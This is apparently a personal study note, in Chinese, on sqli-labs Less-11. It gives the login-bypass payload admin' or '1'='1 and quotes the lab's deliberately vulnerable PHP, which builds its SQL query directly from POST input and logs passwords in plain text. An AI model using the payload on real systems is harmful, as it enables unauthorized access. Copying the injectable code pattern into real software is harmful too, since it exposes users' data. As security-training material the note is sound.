# Less-11

## 0x00 注入

利用sql语句绕过登录

admin' or '1'='1

密码随意。

![image-20210114162403012](D:\WEB安全\笔记\image\image-20210114162403012.png)

![image-20210114162411425](D:\WEB安全\笔记\image\image-20210114162411425.png)



## 0x01 分析

不仅可以绕过登录，还可以像其他sql注入一样爆数据。

```php
  if(isset($_POST['uname']) && isset($_POST['passwd']))
{
        $uname=$_POST['uname'];
        $passwd=$_POST['passwd'];

        //logging the connection parameters to a file for analysis.
        $fp=fopen('result.txt','a');
        fwrite($fp,'User Name:'.$uname);
        fwrite($fp,'Password:'.$passwd."\n");
        fclose($fp);


        // connectivity
        @$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
        $result=mysql_query($sql);
        $row = mysql_fetch_array($result);

        if($row)
        {
                //echo '<font color= "#0000ff">';

                echo "<br>";
                echo '<font color= "#FFFF00" font size = 4>';
                //echo " You Have successfully logged in\n\n " ;
                echo '<font size="3" color="#0000ff">';
                echo "<br>";
                echo 'Your Login name:'. $row['username'];
                echo "<br>";
                echo 'Your Password:' .$row['password'];
                echo "<br>";
                echo "</font>";
                echo "<br>";
                echo "<br>";
                echo '<img src="../images/flag.jpg"  />';

                echo "</font>";
        }
        else
        {
                echo '<font color= "#0000ff" font size="3">';
                //echo "Try again looser";
                print_r(mysql_error());
                echo "</br>";
                echo "</br>";
                echo "</br>";
                echo '<img src="../images/slap.jpg" />';
                echo "</font>";
        }
}
```



